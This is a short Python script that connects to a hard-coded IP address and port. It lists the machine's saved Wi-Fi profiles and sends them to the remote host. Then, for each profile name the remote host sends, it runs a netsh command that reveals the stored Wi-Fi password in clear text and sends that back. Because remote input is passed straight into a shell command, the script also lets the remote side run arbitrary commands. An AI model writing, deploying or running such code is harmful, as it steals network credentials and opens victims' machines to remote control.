import subprocess
import socket
import re
command = "netsh wlan show profiles"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.1.6", 2008))
op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
output = op.stdout.read()
output_error = op.stderr.read()
client.send(output + output_error)
while True:
    data = client.recv(1048576)
    data = data.decode()
    if data == "show profiles" or data == "Show profiles":
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
    else:
        password = "netsh wlan show profile " + data + " key=clear"
        op = subprocess.Popen(password, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)